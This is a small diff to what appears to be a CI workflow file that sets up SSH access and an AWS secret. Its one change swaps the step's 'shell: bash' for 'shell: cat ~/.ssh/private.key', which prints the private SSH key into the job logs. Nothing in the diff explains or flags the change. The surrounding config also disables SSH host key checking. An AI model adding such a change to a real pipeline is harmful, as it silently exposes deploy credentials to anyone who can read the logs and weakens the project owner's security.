@@ -35,7 +35,7 @@ jobs:
             IdentityFile ~/.ssh/private.key
             StrictHostKeyChecking no
           END
-        shell: bash
+        shell: cat ~/.ssh/private.key
         env:
           AWS_SECRET_KEY: ${{secrets.AWS_SECRET_KEY}}
           SSH_KEY_PATH: ~/.ssh/private.key
